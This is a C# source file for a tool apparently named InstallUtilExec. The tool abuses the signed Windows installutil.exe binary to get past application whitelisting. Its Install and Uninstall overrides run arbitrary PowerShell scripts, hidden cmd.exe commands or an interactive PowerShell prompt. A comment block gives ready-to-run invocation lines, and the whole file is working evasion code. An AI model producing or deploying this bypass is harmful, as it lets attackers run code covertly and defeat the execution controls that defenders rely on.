using System;
using System.Diagnostics;
using System.Configuration.Install;
using System.Collections.ObjectModel;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections;

namespace InstallUtilExec
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    /*
     * Run PowerShell
     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U /uninstall=1 /powershell="Get-Host | Out-File -FilePath C:\Temp\test.txt" InstallUtilExec.exe
     * 
     * Run Command
     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U /uninstall=1 /cmd="whoami /priv > c:\temp\test2.txt"  InstallUtilExec.exe
     * 
     * Spawn virtual interactive PowerShell
     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U /uninstall=1 /interactive  InstallUtilExec.exe
     */
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtilExec : System.Configuration.Install.Installer
    {
        static bool isDebug = false;

        static String powershellParameterName = "powershell";
        static String cmdExecutableParameterName = "cmd";
        static String spawnInteractiveParameterName = "interactive";

        static String runOnInstallParameterName = "install";
        static String runOnUninstallParameterName = "uninstall";
        

        String getContextParameter (String parameterName)
        {
            // if (isDebug) Console.WriteLine("Getting Parameter: " + parameterName);

            if (this.Context.Parameters.ContainsKey(parameterName))
            {
                // if (isDebug) Console.WriteLine("Parameter value: " + this.Context.Parameters[parameterName]);

                return this.Context.Parameters[parameterName];
            }

            return null;
        }

        void executePowerShell()
        {
            if (isDebug) Console.WriteLine("Running PowerShell");

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(getContextParameter(powershellParameterName));
            ps.Invoke();
            rs.Close();
        }

        void executeCommand()
        {
            if (isDebug) Console.WriteLine("Running Command");

            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + getContextParameter(cmdExecutableParameterName);
            process.StartInfo = startInfo;
            process.Start();
        }

        void spawnInteractiveShell()
        {
            string command;

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            do
            {
                Console.Write("PS > ");
                command = Console.ReadLine();

                // vervbse check!
                if (!string.IsNullOrEmpty(command))
                {
                    using (Pipeline pipeline = rs.CreatePipeline())
                    {
                        try
                        {
                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");

                            // otherwise stay open and ready to accept and invoke commands
                            Collection<PSObject> results = pipeline.Invoke();
                            //var process = (Process)pipeline.Output.Read().BaseObject;

                            StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
                                stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            }
            while (command != "exit");
        }

        void performExecution()
        {
            // if (isDebug) Console.WriteLine("Perform Execution");

            if (getContextParameter(powershellParameterName) != null)
            {
                executePowerShell();
            }
            else if (getContextParameter(cmdExecutableParameterName) != null)
            {
                executeCommand();
            }
            else if(getContextParameter(spawnInteractiveParameterName) != null) 
            {
                spawnInteractiveShell();
            }
        }

        public override void Install(IDictionary stateSaver)
        {
            if (isDebug) Console.WriteLine("Running Install Method");

            if (getContextParameter(runOnInstallParameterName) == null)
            {
#if DEBUG
                Console.WriteLine("Usage: ");
#endif
                return;
            }

            performExecution();
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            if (isDebug) Console.WriteLine("Running Uninstall Method");

            if (getContextParameter(runOnUninstallParameterName) == null)
            {
#if DEBUG
                Console.WriteLine("Usage: ");
#endif
                return;
            }

            performExecution();
        }
    }
}
